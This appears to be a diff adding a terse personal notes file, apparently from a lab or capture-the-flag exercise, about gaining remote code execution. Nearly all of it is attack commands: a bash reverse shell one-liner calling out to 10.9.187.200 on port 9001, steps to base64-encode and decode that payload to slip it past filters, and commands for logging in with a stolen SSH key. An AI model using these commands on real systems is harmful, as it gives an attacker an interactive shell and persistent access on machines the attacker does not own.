@@ -1,0 +1,23 @@
+rce
+bash -i >& /dev/tcp/10.9.187.200/9001 0>&1
+
+encode
+***
+echo -n "bash -i >& /dev/tcp/10.9.187.200/9001 0>&1 " | base64 -w0
+**
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjE4Ny4yMDAvOTAwMSAwPiYxIA==
+*
+
+
+decode
+***
+echo  "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjE4Ny4yMDAvOTAwMSAwPiYxIgo=" | base64 -d
+**
+bash -i >& /dev/tcp/10.9.187.200/9001 0>&1
+
+
+
+
+ssh**
+chmod 600 id_rsa
+ssh -i id_rsa 
